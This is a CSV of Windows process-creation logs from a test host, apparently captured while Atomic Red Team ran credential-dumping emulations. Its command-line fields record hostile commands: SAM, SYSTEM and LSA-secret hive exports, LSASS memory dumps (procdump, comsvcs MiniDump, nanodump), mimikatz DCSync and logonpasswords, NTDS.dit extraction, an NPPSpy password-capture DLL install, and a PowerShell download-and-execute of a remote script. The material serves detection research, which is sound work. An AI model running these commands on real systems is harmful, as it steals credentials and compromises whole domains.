guid:ID(Process),pid:int,commandLine,user,name,imagePath
08846768-6d17-68ce-b315-000000000c00,11588,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d17-68ce-b415-000000000c00,10784,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d17-68ce-b515-000000000c00,12292,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d17-68ce-b615-000000000c00,8556,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d17-68ce-b715-000000000c00,9576,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d18-68ce-b815-000000000c00,6108,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d18-68ce-b915-000000000c00,13212,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d18-68ce-ba15-000000000c00,9332,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d18-68ce-bb15-000000000c00,2680,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d18-68ce-bc15-000000000c00,3140,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d18-68ce-bd15-000000000c00,10132,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d18-68ce-be15-000000000c00,6276,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d18-68ce-bf15-000000000c00,10800,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d19-68ce-c015-000000000c00,11436,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d19-68ce-c115-000000000c00,5996,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d19-68ce-c215-000000000c00,9732,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d19-68ce-c315-000000000c00,7400,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d19-68ce-c415-000000000c00,12764,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-6d1a-68ce-c515-000000000c00,6624,"""C:\Windows\system32\whoami.exe""",DESKTOP-2I19OQ1\test,whoami.exe,C:\Windows\System32\whoami.exe
08846768-6d1d-68ce-c615-000000000c00,6912,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1003.004\bin\PsExec.exe"" -accepteula -s reg save HKLM\security\policy\secrets %%temp%%\secrets /y",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1d-68ce-c815-000000000c00,4024,C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1003.004\bin\PsExec.exe  -accepteula -s reg save HKLM\security\policy\secrets C:\Users\test\AppData\Local\Temp\secrets /y,DESKTOP-2I19OQ1\test,<unknown process>,<unknown process>
08846768-6d1d-68ce-c915-000000000c00,10108,"""cmd.exe"" /c reg save HKLM\sam %%temp%%\sam & reg save HKLM\system %%temp%%\system & reg save HKLM\security %%temp%%\security",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1d-68ce-cb15-000000000c00,9292,C:\Windows\PSEXESVC.exe,NT AUTHORITY\SYSTEM,PSEXESVC.exe,C:\Windows\PSEXESVC.exe
08846768-6d1d-68ce-cc15-000000000c00,9672,reg  save HKLM\sam C:\Users\test\AppData\Local\Temp\sam ,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\System32\reg.exe
08846768-6d1d-68ce-cd15-000000000c00,2840,"""cmd.exe"" /c cmdkey /list",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1d-68ce-cf15-000000000c00,1688,"""powershell.exe"" & {Get-Content \""""C:\AtomicRedTeam\atomics\T1001.002\bin\T1001.002.jpg\"""", \""""$env:PUBLIC\Downloads\T1001.002.tarz\"""" -Encoding byte -ReadCount 0 | Set-Content \""""$env:PUBLIC\Downloads\T1001.002New.jpg\"""" -Encoding byte}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d1d-68ce-d115-000000000c00,14148,"""cmd.exe"" /c vssadmin.exe create shadow /for=C:",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1e-68ce-d315-000000000c00,13184,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1e-68ce-d515-000000000c00,12500,cmdkey  /list,DESKTOP-2I19OQ1\test,cmdkey.exe,C:\Windows\System32\cmdkey.exe
08846768-6d1e-68ce-d615-000000000c00,7628,vssadmin.exe  create shadow /for=C:,DESKTOP-2I19OQ1\test,vssadmin.exe,C:\Windows\System32\vssadmin.exe
08846768-6d1e-68ce-d715-000000000c00,3208,"""reg"" save HKLM\security\policy\secrets C:\Users\test\AppData\Local\Temp\secrets /y",NT AUTHORITY\SYSTEM,reg.exe,C:\Windows\System32\reg.exe
08846768-6d1e-68ce-d915-000000000c00,13844,C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe  -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp,DESKTOP-2I19OQ1\test,procdump.exe,C:\AtomicRedTeam\ExternalPayloads\procdump.exe
08846768-6d1e-68ce-da15-000000000c00,12224,C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe  -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp,DESKTOP-2I19OQ1\test,procdump64.exe,C:\AtomicRedTeam\ExternalPayloads\procdump64.exe
08846768-6d1e-68ce-db15-000000000c00,4204,"""cmd.exe"" /c %%tmp%%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%%userdnsdomain%% /user:krbtgt@%%userdnsdomain%%"" ""exit""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1f-68ce-dd15-000000000c00,2544,"C:\Users\test\AppData\Local\Temp\mimikatz\x64\mimikatz.exe  ""lsadump::dcsync /domain:%%userdnsdomain%% /user:krbtgt@%%userdnsdomain%%"" ""exit""",DESKTOP-2I19OQ1\test,mimikatz.exe,C:\Users\test\AppData\Local\Temp\mimikatz\x64\mimikatz.exe
08846768-6d1f-68ce-de15-000000000c00,2040,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe"" -a",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d1f-68ce-e015-000000000c00,14048,C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe  -a,DESKTOP-2I19OQ1\test,gsecdump.exe,C:\AtomicRedTeam\ExternalPayloads\gsecdump.exe
08846768-6d1f-68ce-e115-000000000c00,3748,C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe  -a,DESKTOP-2I19OQ1\test,g64-38e.exe,C:\Users\test\AppData\Local\Temp\g64-38e.exe
08846768-6d21-68ce-e215-000000000c00,11248,"""cmd.exe"" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d21-68ce-e415-000000000c00,10496,"""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll\"""" -Destination \""""C:\Windows\System32\""""
$path = Get-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\"""" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + \"""",NPPSpy\""""
Set-ItemProperty -Path $Path.PSPath -Name \""""PROVIDERORDER\"""" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Class\"""" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""Name\"""" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name \""""ProviderPath\"""" -PropertyType ExpandString -Value \""""%%SystemRoot%%\System32\NPPSPY.dll\"""" -ErrorAction Ignore
echo \""""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt\""""}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d21-68ce-e615-000000000c00,9720,reg  save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\System32\reg.exe
08846768-6d21-68ce-e715-000000000c00,12884,"""powershell.exe"" & {cd \""""C:\AtomicRedTeam\atomics\ExternalPayloads\\""""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image \""""C:\AtomicRedTeam\atomics\T1001.002\bin\evil_kitten.jpg\"""" -Out \""""$HOME\result.ps1\""""
$scriptContent = Get-Content \""""$HOME\result.ps1\"""" -Raw
$base64Pattern = \""""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\""""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content \""""$HOME\decoded.ps1\""""
$decodedContent = Get-Content \""""$HOME\decoded.ps1\"""" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = \""""$HOME\textExtraction.ps1\""""
$textMatches -join '' | Set-Content -Path $scriptPath
. \""""$HOME\textExtraction.ps1\""""}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d21-68ce-e915-000000000c00,12816,"""powershell.exe"" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d22-68ce-eb15-000000000c00,12560,"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 688 C:\Users\test\AppData\Local\Temp\lsass-comsvcs.dmp full",DESKTOP-2I19OQ1\test,rundll32.exe,C:\Windows\System32\rundll32.exe
08846768-6d22-68ce-ec15-000000000c00,11604,"""powershell.exe"" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d22-68ce-ee15-000000000c00,13376,"""powershell.exe"" & {Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(\""""\\"""")}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d22-68ce-f015-000000000c00,5348,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\test\AppData\Local\Temp\aqxhz22f\aqxhz22f.cmdline""",DESKTOP-2I19OQ1\test,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
08846768-6d23-68ce-f115-000000000c00,13628,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\test\AppData\Local\Temp\RES9036.tmp"" ""c:\Users\test\AppData\Local\Temp\aqxhz22f\CSC137CC32C677C476890E5794220CBE999.TMP""",DESKTOP-2I19OQ1\test,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
08846768-6d23-68ce-f215-000000000c00,3952,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\test\AppData\Local\Temp\khufrf3k\khufrf3k.cmdline""",DESKTOP-2I19OQ1\test,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
08846768-6d23-68ce-f315-000000000c00,888,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\test\AppData\Local\Temp\RES91EC.tmp"" ""c:\Users\test\AppData\Local\Temp\khufrf3k\CSCCA8A34C278A444EDA991505ABD5B977E.TMP""",DESKTOP-2I19OQ1\test,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
08846768-6d25-68ce-f415-000000000c00,10904,"""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d26-68ce-f615-000000000c00,4348,"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 344 C:\Users\test\AppData\Local\Temp\svchost-exe.dmp full",DESKTOP-2I19OQ1\test,rundll32.exe,C:\Windows\System32\rundll32.exe
08846768-6d26-68ce-f715-000000000c00,7300,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d26-68ce-f915-000000000c00,4004,C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe,DESKTOP-2I19OQ1\test,Outflank-Dumpert.exe,C:\AtomicRedTeam\ExternalPayloads\Outflank-Dumpert.exe
08846768-6d26-68ce-fa15-000000000c00,9056,"""powershell.exe"" & {C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d27-68ce-0116-000000000c00,8808,"""powershell.exe"" & {C:\Windows\System32\inetsrv\appcmd.exe list apppool /config}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d27-68ce-fc15-000000000c00,11860,"""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe -w ""%%temp%%\nanodump.dmp""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d27-68ce-fe15-000000000c00,7780,"C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe  -w ""C:\Users\test\AppData\Local\Temp\nanodump.dmp""",DESKTOP-2I19OQ1\test,nanodump.x64.exe,C:\AtomicRedTeam\ExternalPayloads\nanodump.x64.exe
08846768-6d27-68ce-ff15-000000000c00,10900,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe"" ""sekurlsa::minidump %%tmp%%\lsass.DMP"" ""sekurlsa::logonpasswords full"" exit",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d29-68ce-0316-000000000c00,6564,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz"" live lsa",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d29-68ce-0516-000000000c00,13648,C:\AtomicRedTeam\atomics\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz  live lsa,DESKTOP-2I19OQ1\test,pypykatz.exe,C:\AtomicRedTeam\ExternalPayloads\venv_t1003_001\Scripts\pypykatz.exe
08846768-6d29-68ce-0616-000000000c00,10744,"""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_001\Scripts\python.exe""  ""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_001\Scripts\pypykatz.exe"" live lsa",DESKTOP-2I19OQ1\test,python.exe,C:\AtomicRedTeam\ExternalPayloads\venv_t1003_001\Scripts\python.exe
08846768-6d29-68ce-0716-000000000c00,14232,"""C:\Program Files\Python310\python.exe"" ""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_001\Scripts\pypykatz.exe"" live lsa",DESKTOP-2I19OQ1\test,python.exe,C:\Program Files\Python310\python.exe
